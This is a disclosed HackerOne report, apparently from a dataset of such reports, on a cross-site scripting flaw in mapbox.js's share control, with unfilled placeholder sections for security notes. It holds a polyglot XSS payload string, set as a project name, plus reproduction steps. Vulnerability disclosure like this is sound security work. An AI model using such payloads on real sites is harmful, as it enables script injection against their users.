---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '99245'
original_report_id: '99245'
title: XSS in L.mapbox.shareControl in mapbox.js
weakness: Cross-site Scripting (XSS) - Generic
team_handle: mapbox
created_at: '2015-11-12T09:51:30.203Z'
disclosed_at: '2016-05-03T22:37:49.495Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS in L.mapbox.shareControl in mapbox.js

## Metadata

- HackerOne Report ID: 99245
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: mapbox
- Disclosed At: 2016-05-03T22:37:49.495Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi Mapbox

I've found a xss vulnerability on mapbox sharing system.

I've a project called with "'><img src=a onerror=confirm(2)>"><script>alert(1);</script><iframe onload=alert(97)>"><svg onload=alert(2);>"onmouseover="confirm(2);<input onfocus=prompt(1) autofocus>"--> </script><svg/onload=';alert(/XSSPOSED/);'>"

than click it and copy the share URL and go to URL

than click the the marked area than you will see the vulnerability

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
